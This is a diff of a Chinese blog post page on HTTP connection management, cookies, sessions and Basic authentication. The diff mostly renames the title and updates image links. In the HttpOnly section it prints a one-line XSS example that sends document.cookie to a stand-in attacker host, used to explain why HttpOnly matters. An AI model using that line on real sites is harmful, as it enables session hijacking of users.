@@ -16,25 +16,25 @@
     <meta name="author" content="Lunatic sky">
     <meta name="keywords" content="">
     
-        <meta name="description" content="重新认识HTTP(二) 可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。上一部分主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议">
+        <meta name="description" content="HTTP总结(二) 可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。上一部分主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="重新认识HTTP(二)">
+<meta property="og:title" content="HTTP总结(二)">
 <meta property="og:url" content="http://lunaticsky-tql.github.io/posts/31511/index.html">
 <meta property="og:site_name" content="Lunaticsky&#39;s Blog">
-<meta property="og:description" content="重新认识HTTP(二) 可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。上一部分主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议">
+<meta property="og:description" content="HTTP总结(二) 可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。上一部分主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/Lunaticsky-tql/blog_article_resources/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230825233745413813_440_image-20230825212013023.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Lunaticsky-tql/blog_article_resources/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230826160646173640_409_image-20230825225412200.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205258987659_478_20230825233745413813_440_image-20230825212013023.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205300371135_814_20230826160646173640_409_image-20230825225412200.png">
 <meta property="article:published_time" content="2023-08-26T08:06:51.000Z">
 <meta property="article:modified_time" content="2023-08-26T08:06:51.000Z">
 <meta property="article:author" content="Lunatic sky">
 <meta property="article:tag" content="寄网">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Lunaticsky-tql/blog_article_resources/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230825233745413813_440_image-20230825212013023.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205258987659_478_20230825233745413813_440_image-20230825212013023.png">
     
     
     
-    <title>重新认识HTTP(二) - Lunaticsky&#39;s Blog</title>
+    <title>HTTP总结(二) - Lunaticsky&#39;s Blog</title>
 
     
   
@@ -226,7 +226,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="重新认识HTTP(二)"></span>
+            <span id="subtitle" data-typed-text="HTTP总结(二)"></span>
           
         </div>
 
@@ -275,7 +275,7 @@
                               <!-- https://github.com/Lunaticsky-tql/blog_article_resources/blob/main/page.title.md -->
                               <!-- construct the souce code url-->
                               
-                                <a target="_blank" rel="noopener" href="https://github.com/Lunaticsky-tql/blog_article_resources/blob/main/重新认识HTTP(二)/重新认识HTTP(二).md" style="color: #EA7A99">Article Resource Link</a>
+                                <a target="_blank" rel="noopener" href="https://github.com/Lunaticsky-tql/blog_article_resources/blob/main/HTTP总结(二)/HTTP总结(二).md" style="color: #EA7A99">Article Resource Link</a>
                             </span>
   </div>
   
@@ -307,12 +307,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">重新认识HTTP(二)</h1>
+            <h1 style="display: none">HTTP总结(二)</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="重新认识http二">重新认识HTTP(二)</h1>
+                <h1 id="http总结二">HTTP总结(二)</h1>
 <p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="https://lunaticsky-tql.github.io/posts/64429/">上一部分</a>主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议。</p>
 <h2 id="连接管理">连接管理</h2>
 <p><strong>HTTP/1.0缺省为非持久连接</strong></p>
@@ -345,7 +345,7 @@ Request
 <p>后面会讲到HTTP2通过流的方式解决了这个问题。</p>
 <p>下面以客户端获取一个含有两个图片的网页为例说明比较HTTP1.0和HTTP1.1：</p>
 <figure>
-<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_article_resources/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230825233745413813_440_image-20230825212013023.png" srcset="/img/loading.gif" lazyload alt="image-20230825212013023">
+<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205258987659_478_20230825233745413813_440_image-20230825212013023.png" srcset="/img/loading.gif" lazyload alt="image-20230825212013023">
 <figcaption aria-hidden="true">image-20230825212013023</figcaption>
 </figure>
 <h2 id="连接状态保存">连接状态保存</h2>
@@ -356,25 +356,25 @@ Request
 <p><strong>cookie储存在客户端</strong>。Server 可以在 HTTP response
 中返回 <code>Set-Cookie</code> header 来告诉浏览器要设定 cookie。
 设定的语法如下：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-syjj8kllteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-syjj8kllteephl"><pre><code class="hljs plaintext">Set-Cookie: [cookie名称]=[cookie值]</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u4wbemlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-u4wbemlluxp18z"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>[cookie名称]=[cookie值]</code></pre></div></div>
 <p>浏览器看到 <code>Set-Cookie</code> header 便会将 cookie
 储存起来，之后对同一个 domain 发送 HTTP request 的时候，浏览器就会将
 cookie 带在 HTTP request 的 <code>Cookie</code> header 里。</p>
 <p>Request 中的 cookie header 会是 <code>[cookie名称]=[cookie值]</code>
 的形式，用分号串接之后的结果：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gdhskfllteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-gdhskfllteephl"><pre><code class="hljs plaintext">Cookie: [cookie1]=[value1]; [cookie2]=[value2]</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4hykjjlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-4hykjjlluxp18z"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>[cookie1]=[value1]; [cookie2]=[value2]</code></pre></div></div>
 <p>当然，Web 服务器需要建立后端数据库，记录用户信息。</p>
 <h4 id="相关参数">相关参数</h4>
 <p>在笔试题目中，也考察过cookie相关参数的含义。这里对此也进行细致的讲解。</p>
 <p>Cookie 除了名称和值之外，通常还需要设定其他额外参数，下面会一一介绍。
 新增参数的方式是用分号区隔各个参数，例如：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1fag42llteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-1fag42llteephl"><pre><code class="hljs plaintext">user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9j3wn0lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-9j3wn0lluxp18z"><pre><code class="hljs plaintext">user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
 <p>简单地说，我们会用 <code>Domain</code> 和 <code>Path</code> 指定
 cookie 的可用范围，用 <code>Expires</code> 和 <code>Max-Age</code> 控制
 cookie 的有效期限，而 <code>HttpOnly</code>、 <code>Secure</code>、和
 <code>SameSite</code> 则是和安全性相关的参数。</p>
 <h5 id="domain">Domain</h5>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-eecg3lllteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-eecg3lllteephl"><pre><code class="hljs plaintext">domain=example.com</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wjeeexlluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-wjeeexlluxp18z"><pre><code class="hljs plaintext">domain=example.com</code></pre></div></div>
 <p><code>domain</code> 用来指定哪些网域可以存取这个 cookie。
 <strong>默认值是当前网域，但是不包含其子域。</strong></p>
 <p>例如在 <a target="_blank" rel="noopener" href="http://example.com">example.com</a> 底下设置的 cookie
@@ -385,7 +385,7 @@ cookie 的有效期限，而 <code>HttpOnly</code>、 <code>Secure</code>、和
 <a target="_blank" rel="noopener" href="http://example.com">example.com</a> 以及他的子网域 <a target="_blank" rel="noopener" href="http://subdomain.example.com">subdomain.example.com</a>
 都能够访问这个 cookie。</p>
 <h5 id="path">Path</h5>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-th77c1llteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-th77c1llteephl"><pre><code class="hljs plaintext">path=/admin</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-djgvi0lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-djgvi0lluxp18z"><pre><code class="hljs plaintext">path=/admin</code></pre></div></div>
 <p><code>path</code> 参数用来指定哪些路径可以访问这个cookie。</p>
 <p>例如：假设 domain 是 <a target="_blank" rel="noopener" href="http://example.com">example.com</a>，且
 <code>path=/admin</code>，则 <a target="_blank" rel="noopener" href="http://example.com/admin">example.com/admin</a> 或是子路径 <a target="_blank" rel="noopener" href="http://example.com/admin/settings">example.com/admin/settings</a>
@@ -406,10 +406,10 @@ cookie，如此一来不管在网站的哪个路径下，server 都能认得用�
 <code>expires</code> 或是 <code>max-age</code>。</p>
 <p><code>expires</code> 是 UTC 格式表示的有效期限，在 JavaScript 中可用
 <code>date.toUTCString()</code> 取得：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3jl214llteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-3jl214llteephl"><pre><code class="hljs plaintext">cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xbaobvlluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-xbaobvlluxp18z"><pre><code class="hljs plaintext">cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
 <p><code>max-age</code> 表示从设定开始算之后几秒之内 cookie
 是有效的：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yyxmnnllteephl"></i><span>plaintext</span><div class="collapse show" id="collapse-yyxmnnllteephl"><pre><code class="hljs plaintext">cookie=value; max-age=3600</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uwdg20lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-uwdg20lluxp18z"><pre><code class="hljs plaintext">cookie=value; max-age=3600</code></pre></div></div>
 <h5 id="secure">Secure</h5>
 <p><code>Secure</code> 参数的作用是让 cookie 只能通过 https 传递。
 <strong>Cookie 默认是不区分 http 或是 https 的。</strong></p>
@@ -434,7 +434,7 @@ server，之后这份表单数据在前端呈现的时候恶意的 JavaScript �
 HTML 的一部分被执行。 假设黑客能够执行 JavaScript，便能很轻易地访问
 <code>document.cookie</code>，就能够窃取你用来登入的
 cookie，并且用你的身份做恶意的操作：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yep3nlllteephl"></i><span>javascript</span><div class="collapse show" id="collapse-yep3nlllteephl"><pre><code class="hljs javascript"><span class="hljs-comment">// 把你的 cookie 送到黑客的服务器</span>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ih39q0lluxp18z"></i><span>javascript</span><div class="collapse show" id="collapse-ih39q0lluxp18z"><pre><code class="hljs javascript"><span class="hljs-comment">// 把你的 cookie 送到黑客的服务器</span>
 (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>()).<span class="hljs-property">src</span> = <span class="hljs-string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</code></pre></div></div>
 <p>这就是为什么我们需要禁止 JavaScript 访问 cookie。</p>
 <h4 id="samesite">Samesite</h4>
@@ -459,7 +459,7 @@ cookie 是用来表示用户 id，则对 <a target="_blank" rel="noopener" href=
 而言不管在哪个网域底下，他都知道两个网站的造访者都是你。
 这就是广告追踪的原理。</p>
 <p>现在主流的浏览器都是默认禁止第三方cookie的。如果希望了解更多可以参阅<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/131256002">这篇文章</a></p>
-<h4 id="session">Session</h4>
+<h3 id="session">Session</h3>
 <p>客户端第一次发送信息到服务器时，服务器为该客户端创建一个 session
 对象，该 session 包含客户端身份信息，同时为该 session 生成一个 sessionID
 。 服务端将这个 sessionID 分配给客户端，客户端发送请求时带有此 sessionID
@@ -478,14 +478,14 @@ cookie 是用来表示用户 id，则对 <a target="_blank" rel="noopener" href=
 realm，并且只允许特定的用户访问。</p>
 <p>在这种认证方法下，用户每次发送请求时，请求头中都必须携带能通过认证的身份信息。下面举例说明。</p>
 <p>1.<strong>客户端(例如Web浏览器)</strong>：向服务器请求图片</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8ctgyillteephl"></i><span>http</span><div class="collapse show" id="collapse-8ctgyillteephl"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cover/girl1.jpg</span>  <span class="hljs-string">HTTP/1.1</span></code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-la2t5rlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-la2t5rlluxp18z"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cover/girl1.jpg</span>  <span class="hljs-string">HTTP/1.1</span></code></pre></div></div>
 <p>2.<strong>服务器</strong>：这个资源在安全区data里，是受限资源，需要基本认证，请带上你的用户名和密码再来请求</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ot0w24llteephl"></i><span>http</span><div class="collapse show" id="collapse-ot0w24llteephl"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Authorization Required
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-44jwy9lluxp18z"></i><span>http</span><div class="collapse show" id="collapse-44jwy9lluxp18z"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Authorization Required
 <span class="hljs-attribute">www-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm= "data"</code></pre></div></div>
 <p>服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在
 <code>www-Authenticate</code>这个Header里面有两个值，<code>Basic</code>：说明需要基本认证，<code>realm</code>：说明客户端需要输入这个安全区的用户名和密码。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。</p>
 <p>3.<strong>客户端</strong>：携带相应的用户名密码信息，发送给服务器。</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xyde9sllteephl"></i><span>http</span><div class="collapse show" id="collapse-xyde9sllteephl"><pre><code class="hljs http">GET /cover/girl1.jpg  HTTP/1.1 
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-773joclluxp18z"></i><span>http</span><div class="collapse show" id="collapse-773joclluxp18z"><pre><code class="hljs http">GET /cover/girl1.jpg  HTTP/1.1 
 <span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic
 bHVuYXRpY3NreTp0cWxhMzE0</code></pre></div></div>
 <p>Basic 内容为： <strong>用户名:密码</strong>
@@ -498,7 +498,7 @@ bHVuYXRpY3NreTp0cWxhMzE0</code></pre></div></div>
 </ul>
 <p>另外还有很多其他原因，比如这种基本认证浏览器会弹出一个弹窗要求用户输入用户名和密码，不能进行定制，用户体验不好。</p>
 <figure>
-<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_article_resources/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230826160646173640_409_image-20230825225412200.png" srcset="/img/loading.gif" lazyload alt="image-20230825225412200">
+<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205300371135_814_20230826160646173640_409_image-20230825225412200.png" srcset="/img/loading.gif" lazyload alt="image-20230825225412200">
 <figcaption aria-hidden="true">image-20230825225412200</figcaption>
 </figure>
 <h4 id="session认证">Session认证</h4>
@@ -518,7 +518,7 @@ bHVuYXRpY3NreTp0cWxhMzE0</code></pre></div></div>
 session_id，找到前期保存的数据，由此得知用户的身份。</p>
 </blockquote>
 <h2 id="总结">总结</h2>
-<p>这一部分从HTTP连接的角度介绍了连接管理，连接状态保存和用户认证相关的内容。特别是根据笔试题目对cookie相关的知识点进行了较为详细的补充。后续会进一步从连接的角度对HTTP协议进行剖析。</p>
+<p>这一部分从HTTP连接的角度介绍了连接管理，连接状态保存和用户认证相关的内容。特别是根据最近笔试题目对cookie相关的知识点进行了较为详细的补充。后续会进一步从HTTP发展历程的角度重新深入的认识HTTP。</p>
 
                 
               </div>
@@ -564,7 +564,7 @@ session_id，找到前期保存的数据，由此得知用户的身份。</p>
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>重新认识HTTP(二)</div>
+      <div>HTTP总结(二)</div>
       <div>http://lunaticsky-tql.github.io/posts/31511/</div>
     </div>
     <div class="license-meta">
@@ -609,9 +609,9 @@ session_id，找到前期保存的数据，由此得知用户的身份。</p>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/43947/" title="重新认识HTTP(三)">
+                      <a href="/posts/43947/" title="重新认识HTTP(一)">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">重新认识HTTP(三)</span>
+                        <span class="hidden-mobile">重新认识HTTP(一)</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -619,8 +619,8 @@ session_id，找到前期保存的数据，由此得知用户的身份。</p>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/64429/" title="重新认识HTTP(一)">
-                        <span class="hidden-mobile">重新认识HTTP(一)</span>
+                      <a href="/posts/64429/" title="HTTP总结(一)">
+                        <span class="hidden-mobile">HTTP总结(一)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
